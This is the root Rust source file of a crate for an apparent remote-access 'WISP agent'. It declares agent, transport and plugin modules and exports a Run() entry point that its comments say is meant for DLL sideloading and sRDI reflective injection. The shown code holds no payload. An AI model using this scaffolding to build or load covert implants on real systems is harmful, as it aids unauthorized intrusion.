// WISP agent library crate.
// - EXE build: main.rs calls agent::agent_run().
// - DLL build (cdylib): exports Run() → agent::agent_run(); used by sideloading / sRDI.

pub mod agent;
pub mod overlay;
pub mod plugins;
pub mod protocol;
pub mod registry;
pub mod transport;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hmodule: *mut std::ffi::c_void,
    reason: u32,
    _reserved: *mut std::ffi::c_void,
) -> i32 {
    match reason {
        1 => {} // DLL_PROCESS_ATTACH
        _ => {}
    }
    1
}

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn Run() {
    agent::agent_run(false);
}
